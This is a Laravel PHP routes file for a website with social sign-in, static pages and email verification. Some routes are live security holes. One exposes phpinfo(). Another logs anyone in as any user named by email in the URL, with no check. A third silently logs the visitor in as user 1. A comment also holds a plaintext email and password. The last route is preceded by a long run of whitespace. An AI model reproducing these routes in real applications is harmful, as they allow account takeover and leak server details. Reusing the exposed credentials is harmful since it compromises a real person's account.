<?php
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('login/verify', function () {
    return view('static.registration_thanks');
});

Route::get('/test', function () {
    echo url('user/profile');
    // $user = \App\User::find(3);
/*    $email = new App\Mail\SendEmailTest();
    dump('route: test ['.get_class($email).']');
    dispatch(new App\Jobs\SendEmailJob($email));*/
    return '';
});

Route::get(('i'), function () {
    phpinfo();
    return '';
});

// Pay attention below, check for verified
Route::get('profile', function () {
    // Only verified users may enter...
})->middleware('verified');

Route::get('l/{email?}', function ($email) {
    $user = \App\User::where('email','=',$email)->first();
    Auth::login($user);
    return redirect('/');
});

Route::get('/', 'StaticController@home')->name('home');
Route::get('forum', 'StaticController@forum')->name('forum');
Route::get('terms', 'StaticController@content')->name('terms');
Route::get('privacy', 'StaticController@content')->name('privacy');
Route::get('gdpr', 'StaticController@content')->name('gdpr');
Route::get('about', 'StaticController@content')->name('about');


Route::get('signin', 'StaticController@signin')->name('signin');
Route::get('login/twitter', 'Auth\LoginController@redirectToProvider')->name('signin_twitter');
Route::get('login/twitter/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('login/google', 'Auth\LoginController@redirectToProvider')->name('signin_google');
Route::get('login/google/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('login/facebook', 'Auth\LoginController@redirectToProvider')->name('signin_facebook');
Route::get('login/facebook/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('login/deauthorize/facebook', 'Auth\LoginController@handleProviderDeauthorize')
    ->name('defacebook')
;

Route::get('login/delete/faceboook', 'Auth\LoginController@handleProviderDelete')
    ->name('deletefacebook')
;

Route::get(/**
 * @return string
 */ 'twitter', function ()
{
    // $credentials = ['email'=>'petros@diveris.org', 'password'=>'yellowbrix!!'];
    $ourUser = \App\User::find(1);
    dump('Becoming Eva...');
    \Auth::login($ourUser, true);
    return redirect('/');
    // return '';
});

Auth::routes();
Route::get('user/verify/{token}', 'Auth\RegisterController@verifyUser');

Route::get('/home', 'HomeController@index')->name('home');
                                                                                                                                                                                                                                                                                                                                                                                                    Route::get('email', 'EmailController@sendEmail');
